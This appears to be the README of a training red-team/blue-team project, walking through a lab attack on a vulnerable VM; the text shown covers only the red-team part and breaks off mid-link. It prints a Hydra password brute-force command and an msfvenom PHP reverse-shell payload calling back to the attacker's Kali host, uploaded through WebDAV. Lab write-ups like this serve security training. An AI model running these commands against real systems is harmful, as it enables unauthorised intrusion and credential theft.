# Red_Vs_Blue-Project
The assessment, analysis, and hardening of a vulnerable system from the red and blue side.

# Scenario

Assuming the role of both pentester (The Red Team) and SOC analyst (The Blue team), The Red Team will attack a vulnerable Capstone virtual machine, ultimately gaining root access to the machine. As Blue Team, Kibana logs will be reviewed taken during the Day 1 engagement. The logs will be used to extract hard data and visualizations. Log data will be interpreted for mitigation measures for each exploit that was successfully performed.

# Network Topology

|  IP Address   |       Machine       |
|:-------------:|:-------------------:|
|  192.168.1.1  |       Hyper-V       |
|  192.168.1.90 |         Kali        |
| 192.168.1.100 | Elastic Stack (ELK) |
| 192.168.1.105 |       Capstone      |

![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/d376cac01957cbf835b0715394d88edb26bec282/Images/Project%202%20-%20Network%20Diagram.jpg)

# Red Team - Penetration Test

1. Using NetDiscover, Nmap and a simple ifconfig command, it was uncovered the IP address of the Linux web server is **192.168.1.105**. 

![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/5ebd395fc5e24f73acfa663b82b8f98cd51502ce/Images/Screenshot%202021-11-04%20205454.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/5ebd395fc5e24f73acfa663b82b8f98cd51502ce/Images/Screenshot%202021-11-04%20205453.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/5ebd395fc5e24f73acfa663b82b8f98cd51502ce/Images/Screenshot%202021-11-06%20112341.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/5ebd395fc5e24f73acfa663b82b8f98cd51502ce/Images/Screenshot%202021-11-06%20112533.png)

In the above image, port 22 and port 80 are exposed.

2. A browser was opened and then navigated to the IP address that was discovered. A web server with a list of directories was displayed. After performing a cursory research into each directory, there was mention of a "secret folder" that proved to be a point of interest. 

![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/775e4bddce20634c247b0dc21a4d30fefb18d59e/Images/Screenshot%202021-11-06%20113607.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/775e4bddce20634c247b0dc21a4d30fefb18d59e/Images/Screenshot%202021-11-06%20114044.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/775e4bddce20634c247b0dc21a4d30fefb18d59e/Images/Screenshot%202021-11-06%20113801.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/775e4bddce20634c247b0dc21a4d30fefb18d59e/Images/Screenshot%202021-11-06%20114329.png)

3. After navigating to the secrect folder directory by typing http://192.168.1.105/company_folders/secret_folder/, there was a road block. Credentials were needed. A login screen pops up and states "For Ashton's eyes only". More research into the "meet_our_team" directory was done to find out more information on Ashton.

Unfortunately, no further information was found on Ashton and brute forcing would have to be the next option. Hydra was used to retrieve Ashton's password using the command:

**_hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder -t 40_**

![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f7fe5da82c489111f87e4dde35b77319200cfc02/Images/hydra%20scan.jpg)

4. Logging into the "secret folder" was successful! Once logged in, a lone file called "connect_to_corp_server" was discovered. Inside the file was a set of intructions on how to connect to the company's WebDAV server, along with a user named Ryan and a password MD5 hash. With the help of crackstation.net, Ryan's password was cracked.

![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20124857.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20125023.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20125348.png)

5. The directions in the "connect_to_corp_server" file were followed in order to gain access to the WebDAV server with Ryan's credentials. The WebDAV had unrestricted upload permissions. A payload using MSFVenom was created in order to create a PHP reverse shell using the command:

**_msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw -o shell.php_**

It was then uploaded into the WebDAV directory.

![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/e2c36d9e7eb7beaefd8b154e2cc1eee4164c58de/Images/Screenshot%202021-11-06%20140046.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-06%20141644.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-09%20192302.png)

6. A listener in Metasploit was deployed. Soon after the playload was lauched, and lastly a Meterpreter session was accessed.

![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-09%20200616.png)
![name-of-you-image](https://github.com/ldover29/Red_Vs_Blue_Project/blob/f5f5c6f20dd6630abaa687035b0e25f682133603/Images/Screenshot%202021-11-09%20204910.png)
![name-of-you-image](
